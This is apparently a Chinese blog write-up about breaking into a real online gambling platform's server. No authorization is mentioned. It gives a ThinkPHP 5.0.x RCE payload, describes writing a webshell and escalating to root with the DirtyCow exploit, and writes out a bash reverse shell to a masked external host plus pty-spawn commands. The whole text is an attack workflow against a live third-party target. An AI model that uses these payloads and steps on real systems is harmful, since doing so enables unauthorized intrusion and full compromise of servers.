**正文**

前几天搜集了一下某湾资产发现一个bc平台，看起来像是有段时间了。

主页面全无入手点后，fofa查了一下ip开始挨个排查ip，8090端口打开没有啥服务但是一看这个图标就想到了thinkphp。

![](../Images/beda1c7ef266b3db00ac462bb5230882.png)

![](../Images/ff59277eaaffa7bad9181cd65236acb0.png)

  

云溪测了一下确定是tp和宝塔现在就有两个点可以进行探测,开始挨个排查thinkphp的历史漏洞。

利用工具进行探测的时候发现是存在这个漏洞的手工复习又不存在了

  

*   
*   

```
存在ThinkPHP 5.0.10 construct RCE?s=index%20Post:%20_method=__construct&method=get&filter[]=phpinfo&get[]=-1
```

![](../Images/094028c151a554d85921440e8abeba29.png)

上一个利用失败后幸好还有一个差不多的版本的rce可以尝试一下，利用成功写shell开始做内网。

![](../Images/b6c92f09d2134fa3e6411a55f4625568.png)

开始信息收集，Linux系统，非root权限，ifconfig看了一下ip没有内网环境，也不用做横向其他的玩意。

![](../Images/64d486633bdc4e39dda1131cf9c63cb1.png)

尝试利用suid和sudo提权

sudo失败

![](../Images/c955242ecdb44fe727f199d14395f455.png)

suid也失败了

![](../Images/d13e89dc7a71dd73e5ee3c70b7ab32a8.png)

上传 LES对系统进行扫描后发现脏牛比较靠谱剩下的利用价值不大

![](../Images/72ba820097d8cfb2ea22797c78d97f4e.png)

下载c文件

https://github.com/FireFart/dirtycow

上传后进行编译运行

![](../Images/0bd18c2ffa8be577f7b334dc1d05c4af.png)

看一眼etc/passwd看一下有没有用户生成，成功生成

![](../Images/d4709a2b8ba65d1f5b41146fc558e3b4.png)

su切换账户失败了，终端类型不对，不能利用su

![](../Images/a9be9b45f03de99a5d1ee1ee576b9f60.png)

转化一下shell类型

*   
*   

```
python -c 'import pty; pty.spawn("/bin/sh")'python -c 'import pty; pty.spawn("/bin/bash")'
```

  

切换失败了，有人说可能是权限太小的问题， 我觉得可能不对，也可能是shell类型的原因

![](../Images/a5d3db49c244fe85b0eba3986cd61fc2.png)

把shell反弹到公网服务器上

蚁剑使用bash反弹shell

bash -c 'exec bash -i &>/dev/tcp/1111111111111111/5555 <&1'

服务端nc接收shell

![](../Images/6e9128ead5f1194fbee3e1ebe67b473a.png)

nc接收后查看权限依旧为www

![](../Images/67dd0dad1c13058715fa94a7c4806268.png)

使用 python -c 'import pty; pty.spawn("/bin/sh")' 会出现，这不是报错是正常的

![](../Images/c1ef9cc04107b875a37324451ac6c344.png)

然后政策切换账户成功 root权限

![](../Images/b56f8255097c424bdb2a3530cddba424.png)

后面利用root权限进行信息收集的时候发现存在一个PHPunit其中也有一个rce上去就是root权限，手太快了搞这一圈

![](../Images/b4764c4b8f14040886a43156d3cf1c83.png)
